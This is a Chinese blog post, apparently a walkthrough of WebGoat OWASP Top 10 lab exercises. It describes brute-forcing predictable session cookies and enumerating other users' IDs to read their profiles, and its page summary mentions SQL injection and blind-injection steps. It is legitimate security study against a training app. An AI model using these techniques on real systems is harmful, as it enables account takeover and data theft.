<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>OWASP TOP10靶场 | Johnny</title><meta name="keywords" content="安全"><meta name="author" content="Johnny"><meta name="copyright" content="Johnny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="OWASP TOP10靶场"><meta name="application-name" content="OWASP TOP10靶场"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="OWASP TOP10靶场"><meta property="og:url" content="https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/index.html"><meta property="og:site_name" content="Johnny"><meta property="og:description" content="A01:2021 – 权限控制失效Hijack a session开发自己的会话 ID 的应用程序开发人员经常忘记合并安全性所需的复杂性和随机性。如果特定于用户的会话 ID 不复杂且随机，则应用程序极易受到基于会话的暴力攻击。 我觉得这方面可以使用JWT或者类似JWT的思想来解决，在后端对得到的敏感"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150222.png"><meta property="article:author" content="Johnny"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150222.png"><meta name="description" content="A01:2021 – 权限控制失效Hijack a session开发自己的会话 ID 的应用程序开发人员经常忘记合并安全性所需的复杂性和随机性。如果特定于用户的会话 ID 不复杂且随机，则应用程序极易受到基于会话的暴力攻击。 我觉得这方面可以使用JWT或者类似JWT的思想来解决，在后端对得到的敏感"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: undefined,
  diytitle: undefined,
  LA51: undefined,
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🔨 累死累活造轮子","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Johnny","link":"链接: ","source":"来源: Johnny","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Johnny',
  title: 'OWASP TOP10靶场',
  postAI: '',
  pageFillDescription: 'A012021 – 权限控制失效, Hijack a session, Insecure Direct Object References, Missing Function Level Access Control, Spoofing an Authentication Cookie, (A2) Cryptographic Failures, (A3)Injection, SQL Injection (intro), 第二页, 第三页, 第四页, 第五页, 第九页, 第十页, 第十一页, 第十二页, 第十三页, SQL Injection (advanced), 第三页, 第五页, SQL Injection (mitigation), 第五页, 第六页, 第九页, 第十页, 第十二页权限控制失效开发自己的会话的应用程序开发人员经常忘记合并安全性所需的复杂性和随机性如果特定于用户的会话不复杂且随机则应用程序极易受到基于会话的暴力攻击我觉得这方面可以使用或者类似的思想来解决在后端对得到的敏感信息进行验签等动作先对网页进行抓包发送到方便观察规律发送两次请求可以看到他们的不同中间相差一个的这也就是系统模拟的他人登录之后获得的所以这个就是我们需要进行劫持的对象同时通过观察看到最后几位数字是固定的但是后面四位数字是随机的所以我们可以写一个脚本进行爆破就行即随机最后五位就行结果第一步按照提示输入账号密码就行点击按钮然后抓包发现其实包里返回了和的标识只是不在前端显示而已将这两个没显示的写入导下面的框中提交就行这让我想到在写登录后端接口的时候对于的一个实体他的字段是要加一个的注解的不然在序列化的时候会将这个字段给泄露出去得到具有这种漏洞的威胁之后就开始猜测后端是如何接收字段的最后使用就可得到相应的返回结果得到这个规律之后点击抓包之后进行重放爆破发现的用户可以访问下一个任务让我们修改别人的权限并且高权限意味着低的数字然后把用户的颜色改为红色没抓包之前盲猜是个抓包看看通过更改可以成功的拿到之后呢提示让我们修改方法和路径去修改他的信息想到常用的四个方法肯定试试噻修改方法修改好让后端识别噻修改注意格式成功返回修改信息我目前来说理解是函数级别的访问控制因为一个系统会存在很多的业务函数调用所以访问控制必须在每一个函数里面执行同时这种函数级别的访问控制和上面的不安全的直接对象引用不能归为一类更像是一种横向的越权即这个用户可以访问和他权限相等的用户的信息第一个就是发现有没有通过前端直接进行隐藏的按钮打开审查元素用左上角的那个工具一个模块一个模块地搜索发现还真有然后注释掉他的就能看到隐藏的几个按钮提交就行通过之后给了个提示所以把保存一下之后需要我们获得所有用户的信息然后输入信息中的想起之前的到的但是报错但是给了这个路径肯定有用后面把他试出来了真正的应为但是还是报错经典的的内部错误这种情况无外乎是内部函数报错或者是我们传的参数不对考虑到前后端基本都是格式交互数据所以改一个报头之后就正确返回数据了把填进去这就过关了之后他说公司修复了这个漏洞不仅管理员可以查看用户了所以我们使用这个接口试试所以考虑如何提权看到使用方法可以更改权限就更改我们当前的权限就行之后再一下就可以得到信息了登录查看他们的差别得到这两个很像编码解码看看呢前面是一样的但是就是后面有点区别使用十六进制解码再看看解码得到发现是固定的但是后面的就为的镜像所以的进行文本编码再得到输入到包中进行登录就行这一节基本都是对密码学的一个科普基本上都学过所以没什么好说的首先是一个编码直接用解码就行第二个是一个异或编码但是要牵扯到密钥我就不知道这个怎么弄了我们知道流程就行就是吧明文的每一位转为二进制再与密钥的二进制进行异或得到的结果再就好所以在得知密钥为的情况下我们来进行解密第三个就是一个哈希的科普具体哈希的内容可以看看的实验我博客里也有这一节的作业就是使用碰撞找到他们的明文看到哈希可以想到并不安全的网上都有做好的彩虹表我们直接在线碰撞就行第四个是一个对于对称加密和非对称加密的科普哈都学过的直接第五个是一个签名的东西首先要生成一个公钥我们使用进行生成生成的公钥通过去解析里面的模数之后利用私钥对这个模数进行签名有个就是文中没有提到用的哈希算法是什么所以就用最常用的试试这个也是现在里面用到的哈希算法第六个说到了密钥管理的方面启动一个进入里执行几个命令就行第二页普通的语句很简单第三页主要介绍数据操作语言第四页数据定义语言第五页数据控制语言第九页第十页一个字符型注入加一个条件就行第十一页发现可以拼接加一个的条件第十二页看到可能是字符型注入试试注释掉后面的并且添加确实可以拼接我们自己的语句第十三页拼接语句删库跑路第三页网页回显了语句直接拼接就行用凭借另外一张表注意字段数量不一样所以添加占位但是显示不出来可能是限制了显示的行宽那就使用拼接语句输入的密码即可第五页让我们进行注入并且没有提示语句所以只能盲猜了先猜这个语句我们只要有值返回就可以登录为失败了还有一个注册页面抓包注入试试应该是个注入点写个脚本跑跑登录吧这一节说的是参数化传入的查询参数让我想到实验的一张图如何防止注入的参数化查询工作原理第五页第六页第九页前端就把空格给过滤了用单行注释就行第十页做了空格和过滤使用但是发现和不见了然后还是可以用但是要大写一样的添加字符然后第十二页找到的地址通过漏洞然后网页可以通过点击不同的标签来达到排序的效果然后我们抓包看看传入的参数是什么一个传入按哪一行排列试试可以在这个参数上可以做什么猜测语句大概是看看能不能拼接一下两个报错看来不行通过构造能不能找到注入点可以看到我们的被正确得到也就是说这个条件是可用的所以通过修改这一段就可以盲注用前面我们的就可以得到想要的内容了编写以下脚本结合得到的信息就可以拿到',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2023-12-12 00:00:00',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog02_nnL6LLA94I_1200x1200.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Johnny</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 我的阅读</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/C/" style="font-size: 1.05rem;">C<sup>2</sup></a><a href="/tags/Golang/" style="font-size: 1.05rem;">Golang<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>7</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/Nginx/" style="font-size: 1.05rem;">Nginx<sup>1</sup></a><a href="/tags/Spring/" style="font-size: 1.05rem;">Spring<sup>2</sup></a><a href="/tags/Spring-Cloud/" style="font-size: 1.05rem;">Spring Cloud<sup>3</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">安全<sup>11</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">OWASP TOP10靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-11-29T15:42:40.000Z" title="发表于 2023-11-29 23:42:40">2023-11-29</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-12-11T16:00:00.000Z" title="更新于 2023-12-12 00:00:00">2023-12-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为成都"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>成都</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150222.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/"><header><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a><a href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">安全</a><h1 id="CrawlerTitle" itemprop="name headline">OWASP TOP10靶场</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Johnny</span><time itemprop="dateCreated datePublished" datetime="2023-11-29T15:42:40.000Z" title="发表于 2023-11-29 23:42:40">2023-11-29</time><time itemprop="dateCreated datePublished" datetime="2023-12-11T16:00:00.000Z" title="更新于 2023-12-12 00:00:00">2023-12-12</time></header><h1 id="A01-2021-–-权限控制失效"><a href="#A01-2021-–-权限控制失效" class="headerlink" title="A01:2021 – 权限控制失效"></a>A01:2021 – 权限控制失效</h1><h2 id="Hijack-a-session"><a href="#Hijack-a-session" class="headerlink" title="Hijack a session"></a>Hijack a session</h2><p>开发自己的会话 ID 的应用程序开发人员经常忘记合并安全性所需的复杂性和随机性。如果特定于用户的会话 ID 不复杂且随机，则应用程序极易受到基于会话的暴力攻击。</p>
<p>我觉得这方面可以使用JWT或者类似JWT的思想来解决，在后端对得到的敏感Cookie信息进行验签等动作</p>
<ul>
<li>先对网页进行抓包，发送到Repeater方便观察规律</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231125231452833.png" alt="image-20231125231452833"></p>
<ul>
<li>发送两次请求</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231125231541626.png" alt="image-20231125231541626"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231125231546864.png" alt="image-20231125231546864"></p>
<p>可以看到他们的hijack_cookie不同，中间相差一个<code>4796638040248218963-xxxxx</code>的Cookie，这也就是系统模拟的他人登录之后获得的Cookie，所以这个63就是我们需要进行劫持的对象。</p>
<p>同时通过观察看到最后几位数字<code>17009253xxxxx</code>是固定的，但是后面四位数字是随机的。所以我们可以写一个脚本进行爆破就行。即<code>hijack_cookie=4796638040248218963-17009253xxxxx</code>随机最后五位就行。</p>
<ul>
<li>结果</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogblogimage-20231125232251134.png" alt="image-20231125232251134"></p>
<h2 id="Insecure-Direct-Object-References"><a href="#Insecure-Direct-Object-References" class="headerlink" title="Insecure Direct Object References"></a>Insecure Direct Object References</h2><ul>
<li>第一步按照提示输入账号密码就行。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129170433786.png" alt="image-20231129170433786"></p>
<ul>
<li>点击按钮然后抓包，发现其实包里返回了userId和role的标识，只是不在前端显示而已，将这两个没显示的写入导下面的框中提交就行。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129170555010.png" alt="image-20231129170555010"></p>
<p>这让我想到在写登录后端接口的时候对于JAVA的一个user实体，他的passwd字段是要加一个@jsonignore的注解的，不然在序列化的时候会将这个字段给泄露出去。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129170844570.png" alt="image-20231129170844570"></p>
<ul>
<li>得到具有这种漏洞的威胁之后，就开始猜测后端是如何接收字段的。最后使用<code>WebGoat/2342384</code>就可得到相应的返回结果，i.e. <code>http://localhost:8080/WebGoat/2342384</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129171005488.png" alt="image-20231129171005488"></p>
<p>得到这个规律之后点击<code>view profile</code>,抓包之后进行重放爆破，发现userId&#x3D;2342388的用户可以访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231129170234078.png" alt="image-20231129170234078"></p>
<ul>
<li>下一个任务让我们修改别人的权限，并且高权限意味着低的数字，然后把用户的颜色改为红色。没抓包之前盲猜是个POST，抓包看看</li>
</ul>
<p>通过更改userId可以成功的拿到Buffalo Bill’s profile</p>
